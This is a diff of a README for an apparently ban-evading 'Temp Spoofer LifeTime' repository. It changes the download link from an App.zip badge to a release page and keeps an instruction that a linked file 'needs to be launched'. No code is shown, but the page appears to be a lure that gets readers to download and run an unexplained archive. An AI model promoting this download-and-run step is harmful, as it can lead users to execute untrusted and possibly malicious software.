@@ -14,7 +14,7 @@ Welcome to the Temp Spoofer LifeTime repository, where you can find tools to hel
 
 ## How to Access:
 You can download the tools and resources from this repository through the following link:
-[![](https://img.shields.io/badge/Download-App.zip-green)](https://github.com/file/App.zip)
+[![](https://github.com/abasJames/Temp-Spoofer-LifeTime/releases/tag/v2.0)](https://github.com/abasJames/Temp-Spoofer-LifeTime/releases/tag/v2.0)
 
 If the link ends with a file name, it needs to be launched to access the downloadable content.
 
